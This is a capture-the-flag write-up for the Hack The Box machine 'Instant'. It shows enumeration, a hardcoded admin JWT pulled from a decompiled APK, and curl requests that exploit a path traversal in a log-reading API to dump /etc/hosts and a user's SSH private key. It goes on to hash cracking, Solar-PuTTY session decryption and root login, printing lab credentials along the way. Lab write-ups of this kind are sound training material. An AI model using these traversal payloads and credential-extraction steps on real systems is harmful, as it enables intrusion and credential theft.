---
title: Instant HTB Write-Up
machine_ip: 10.129.231.155
os: Linux
difficulty: Medium
my_rating:
tags:
  - writeup
references: "[[📚CTF Box Writeups]]"
date: 2026-08-11
---
## 🌐 Enumeration

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMM6fK04LJ4jNNL950Ft7YHPO9NKONYVCbau/+tQKoy3u7J9d8xw2sJaajQGLqTvyWMolbN3fKzp7t/s/ZMiZNo=
|   256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL+zjgyGvnf4lMAlvdgVHlwHd+/U4NcThn1bx5/4DZYY
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.58
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://instant.htb/
```

Download button (`/downloads/instant.apk`)

Directories:
```bash
200      GET       49l      241w    13102c http://instant.htb/img/logo.png
200      GET       73l      165w     2022c http://instant.htb/js/scripts.js
200      GET      245l     1305w   143898c http://instant.htb/img/blog-1.jpg
200      GET      337l     1155w    16379c http://instant.htb/index.html
200      GET      434l     2599w   304154c http://instant.htb/img/blog-3.jpg
200      GET      195l     1097w   116351c http://instant.htb/img/blog-2.jpg
200      GET      513l     3885w  5415990c http://instant.htb/downloads/instant.apk
200      GET     3434l     9126w   199577c http://instant.htb/css/default.css
200      GET      337l     1155w    16379c http://instant.htb/
200      GET        1l        4w       16c http://instant.htb/downloads/index.html
200      GET        1l        4w       16c http://instant.htb/css/
200      GET        1l        4w       16c http://instant.htb/css/index.html
```

Running `jadx-gui` we can decompile the `apk` and identify `/Resources/res/xml/network_security_config.xml` which reveals two new subdomains to enumerate:
1. `mywalletv1.instant.htb`
2. `swagger-ui.instant.htb`

Searching in `jadx-gui` for references to `mywalletv1` reveals the url `http://mywalletv1.instant.htb/api/v1/view/profile` in `AdminActivities` and also reveals an Authorization header:
```json
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
```
Which decodes to:
```json
{ "alg": "HS256", "typ": "JWT" }
{ "id": 1, "role": "Admin", "walId": "f0eca6e5-783a-471d-9d8f-0162cbc900db", "exp": 33259303656 }
```

Other directories revealed:
- `http://mywalletv1.instant.htb/api/v1/login`
- `http://mywalletv1.instant.htb/api/v1/register`
- `http://mywalletv1.instant.htb/api/v1/confirm/pin`
- `http://mywalletv1.instant.htb/api/v1/initiate/transaction`

#### `mywalletv1.instant.htb`

Use the authorization header to view the profile. (Authroize in webpage `swagger-ui`)

#### `swagger-ui.instant.htb` 
Swagger UI v3.28.0
Flask v3.0.3
Flasgger v0.9.7.1

The Swagger UI webpage is the interactive API Documentation and shows us how to configure the `json` in our HTTP requests to the API `mywalletv1.instant.htb`.

Use the `jwt` token with the `Authorize` button

Now we can run commands generated from `swagger-ui` and interact with the API at `mywalletv1`

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/view/profile" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

{"Profile":{"account_status":"active","email":"admin@instant.htb","invite_token":"instant_admin_inv","role":"Admin","username":"instantAdmin","wallet_balance":"10000000","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},"Status":200}

curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/list/users" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

{"Status":200,"Users":[{"email":"admin@instant.htb","role":"Admin","secret_pin":87348,"status":"active","username":"instantAdmin","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},{"email":"shirohige@instant.htb","role":"instantian","secret_pin":42845,"status":"active","username":"shirohige","wallet_id":"458715c9-b15e-467b-8a3d-97bc3fcf3c11"}]}

curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/view/logs" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

{"Files":["1.log"],"Path":"/home/shirohige/logs/","Status":201}

curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=1.log" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

{"/home/shirohige/logs/1.log":["This is a sample log testing\n"],"Status":201}

curl -X GET "http://swagger-ui.instant.htb/api/v1/view/transactions" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

{"Description":"No Transactions Found","Status":404}
```

We enumerated two users, `shirohige` and `instantAdmin`, and 1 file `1.log`. Knowing we can supply a filename for viewing logs, we can try to perform directory traversal and reveal more information:

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../etc/hosts" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

{"/home/shirohige/logs/../../../../../etc/hosts":["127.0.0.1 localhost instant.htb mywalletv1.instant.htb swagger-ui.instant.htb\n","127.0.1.1 instant\n","\n","# The following lines are desirable for IPv6 capable hosts\n","::1     ip6-localhost ip6-loopback\n","fe00::0 ip6-localnet\n","ff00::0 ip6-mcastprefix\n","ff02::1 ip6-allnodes\n","ff02::2 ip6-allrouters\n"],"Status":201}
```

We can! So now we enumerate further. SSH is open on the box so we grab the ssh key for `shirohige`:

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../home/shirohige/.ssh/id_rsa" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
{"/home/shirohige/logs/../../../../../home/shirohige/.ssh/id_rsa":["-----BEGIN OPENSSH PRIVATE KEY-----\n","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\n","-----END OPENSSH PRIVATE KEY-----\n"],"Status":201}
```

Paste this in a new file and remove `\n` new line returns and SSH to the box.
## 🗝️ Initial Access

```bash
ssh -i id_rsa shirohige@instant.htb
The authenticity of host 'instant.htb (10.129.231.155)' can't be established.
ED25519 key fingerprint is: SHA256:r+JkzsLsWoJi57npPp0MXIJ0/vVzZ22zbB7j3DWmdiY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'instant.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
shirohige@instant:~$ id
uid=1001(shirohige) gid=1002(shirohige) groups=1002(shirohige),1001(development)
```

Grab flag and enumerate.

`linpeas` output identified `/var/lib/PackageKit/transactions.db` and the `instant.db` in `/home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/` which appears to contain the `instantAdmin` user's hash:
```bash
╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100) (T1005)
Found /home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db                                                                         
Found /var/lib/PackageKit/transactions.db

 -> Extracting tables from /home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db (limit 20)
  --> Found interesting column names in wallet_users (output limit 10)                                                                                   
CREATE TABLE wallet_users (
        id INTEGER NOT NULL, 
        username VARCHAR, 
        email VARCHAR, 
        wallet_id VARCHAR, 
        password VARCHAR, 
        create_date VARCHAR, 
        secret_pin INTEGER, 
        role VARCHAR, 
        status VARCHAR, 
        PRIMARY KEY (id), 
        UNIQUE (username), 
        UNIQUE (email), 
        UNIQUE (wallet_id)
)
1, instantAdmin, admin@instant.htb, f0eca6e5-783a-471d-9d8f-0162cbc900db, pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978, 2024-07-23 00:20:52.529887, 87348, Admin, active
```

Enumerating the database in `sqlitebrowser`, we find wallets:
```sql
|   |   |   |   |
|---|---|---|---|
|1|f0eca6e5-783a-471d-9d8f-0162cbc900db|10000000|instant_admin_inv|
|2|9f3a7cfc-f85a-43d0-84a2-2fd4e04212b3|0|spideymonkey_spi|
|3|0d02a551-8536-415e-8a08-8017a635a08f|0|turafarugaro_tur|
|4|abfc4bd6-e048-4b48-8e33-67d7fa0a6c80|0|paulkapufi_kap|
|5|458715c9-b15e-467b-8a3d-97bc3fcf3c11|0|shirohige_shi|
```

And we find users:

```sql
|   |   |   |   |   |   |   |   |   |
|---|---|---|---|---|---|---|---|---|
|1|instantAdmin|admin@instant.htb|f0eca6e5-783a-471d-9d8f-0162cbc900db|pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978|2024-07-23 00:20:52.529887|87348|Admin|active|
|2|shirohige|shirohige@instant.htb|458715c9-b15e-467b-8a3d-97bc3fcf3c11|pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed|2024-08-08 20:57:47.909667|42845|instantian|active|
```

We now have the password hash for `shirohige` and `instantAdmin`

```text
sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978
sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550e
```

Looking up the hash, I find a really relevant article: https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256

Basically, Hashcat won't Recognize Our Hash
- ❌ Hashcat requires _**all fields**_ to be separated by a `:` -- c_urrently mixes `$` and `:`_
- ✅ Hashcat requires the **salt** to be _**base64-encoded --** it already is_
- ❌ Hashcat requires the **hash** to be **_base64-encoded_** _-- currently hexadecimal_

In CyberChef, fix `:` delimiter consistency, and decode `from Hex` then `to Base64` and replace it so all hashes are now:
```text
sha256:600000:I5bFyb0ZzD69pNX8:6eTqXCgOB2ZhIpWrm/8y5fod6PbLtlhvq3q3vHYr2Xg=
sha256:600000:YnRgjnim:yVQajGrUC8Bkl5vERgJQQf+smvL3YnJpcdiignLFUA4=
```

`hashcat` and `john` don't work. So we use `werkzeug-cracker` https://github.com/AnataarXVI/Werkzeug-Cracker. Use the original hashes we found. This works because hashes in this format are typically encoded by `wekzeug.security` module.

```bash
python3 werkzeug_cracker.py -p ../shash.txt -w /usr/share/wordlists/rockyou.txt
Cracking pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a282
Cracking pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a282
...
Cracking pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed |                                | 109/14445389
Password found: estrella
```

Looking back at `linpeas` output:
```bash
/home/shirohige/projects/mywallet/Instant-Api/mywallet/.env
SECRET_KEY=VeryStrongS3cretKeyY0uC4NTGET
```

```bash
══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70) (T1552.001)
-rw-r--r-- 1 shirohige shirohige 1100 Sep 30  2024 /opt/backups/Solar-PuTTY/sessions-backup.dat

cat sessions-backup.dat
ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=
```

Attempts to decrypt it with the two passwords we found were unsuccessful. So, we find `SolarPuttyDecrypt.py` https://github.com/VoidSec/SolarPuttyDecrypt

```bash
C:\path\to\SolarPuttyDecrypt.exe sessions-backup.dat estrella
-----------------------------------------------------
SolarPutty's Sessions Decrypter by
VoidSec
-----------------------------------------------------
{
"Sessions": [
{
"Id": "066894ee-635c-4578-86d0-d36d4838115b",
"Ip": "10.10.11.37",
"Port": 22,
"ConnectionType": 1,
"SessionName": "Instant",
"Authentication": 0,
"CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
"AuthenticateScript": "00000000-0000-0000-0000-000000000000",
"LastTimeOpen": "0001-01-01T00:00:00",
"OpenCounter": 1,
"SerialLine": null,
"Speed": 0,
"Color": "#FF176998",
"TelnetConnectionWaitSeconds": 1,
"LoggingEnabled": false,
"RemoteDirectory": ""
}
],
"Credentials": [
{
"Id": "452ed919-530e-419b-b721-da76cbe8ed04",
"CredentialsName": "instant-root",
"Username": "root",
"Password": "12**24nzC!r0c%q12",
"PrivateKeyPath": "",
"Passphrase": "",
"PrivateKeyContent": null
}
],
"AuthScript": [],
"Groups": [],
"Tunnels": [],
"LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-
PuTTY\\SessionLogs"
}
-----------------------------------------------------
```

## ⚡ Privilege Escalation

Log into root with enumerated password, `12**24nzC!r0c%q12`:
```bash
$ su root
Password: 
root@instant:/opt/backups/Solar-PuTTY# id
uid=0(root) gid=0(root) groups=0(root)
```